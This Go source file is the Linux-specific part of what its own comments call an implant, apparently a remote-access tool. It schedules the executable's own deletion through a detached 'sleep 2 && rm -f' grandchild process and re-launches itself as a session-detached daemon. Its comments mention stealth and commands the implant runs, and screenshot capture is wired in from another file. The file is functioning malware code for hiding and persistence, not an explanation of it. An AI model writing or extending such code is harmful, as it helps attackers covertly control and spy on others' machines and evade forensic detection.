//go:build linux

package main

import (
	"fmt"
	"os/exec"
	"syscall" // Added for SysProcAttr
	// "time" // Not needed here specifically but good for general use
)

func init() {
	// Assign Linux-specific implementations to global function variables
	doSelfDelete = linuxScheduleSelfDeleteGrandchild // Updated function
	setOSSpecificAttrs = linuxSetOSSpecificAttrs
	// takeScreenshot is assigned in screenshot_linux.go
	relaunchAsDaemonInternal = linuxRelaunchAsDaemon // New assignment
}

// linuxScheduleSelfDeleteGrandchild schedules deletion of the given exePath via a detached grandchild process.
func linuxScheduleSelfDeleteGrandchild(exePath string) {
	// Use Go's %q to ensure the path is correctly quoted for the shell.
	quotedExePath := fmt.Sprintf("%q", exePath)
	deleterCmdScript := fmt.Sprintf("sleep 2 && rm -f %s", quotedExePath)

	cmd := exec.Command("sh", "-c", deleterCmdScript)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true, // Detach from the current session, run independently.
		// Noctty: true, // Could also be set if you want to be absolutely sure no TTY is acquired.
	}

	// Start the command and detach. We don't wait for it or care about its output.
	// Errors here are internal to the implant's self-deletion; they shouldn't stop the implant.
	err := cmd.Start()
	if err != nil {
		// For stealth, avoid printing to implant's stdout/stderr if they are somehow captured.
		// If logging is implemented, log this error.
		// fmt.Fprintf(os.Stderr, "Failed to start self-delete grandchild process: %v\n", err)
	}
}

// linuxRelaunchAsDaemon re-executes the implant in a new, detached session.
func linuxRelaunchAsDaemon(exePath string, args []string) error {
	cmd := exec.Command(exePath, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true, // Create a new session, detaching from the controlling terminal.
	}
	// The new process should not inherit open file descriptors like Stdin, Stdout, Stderr
	// unless explicitly needed (which is not the case for a detached daemon).
	// cmd.Stdin = nil
	// cmd.Stdout = nil
	// cmd.Stderr = nil
	return cmd.Start() // Start the process and return immediately. The parent (initial) process will exit.
}

// linuxSetOSSpecificAttrs is for commands *executed by* the implant (e.g. shell commands).
func linuxSetOSSpecificAttrs(cmd *exec.Cmd) {
	// On Linux, for regular command execution, typically no special attributes are needed
	// to hide windows as there's no GUI window concept for console commands by default.
	// If needing to ensure a command itself is further detached (e.g., setpgid),
	// you could set it here:
	// cmd.SysProcAttr = &syscall.SysProcAttr{
	//    Setpgid: true,
	// }
	// For now, it remains a no-op as per original, which is usually fine.
}
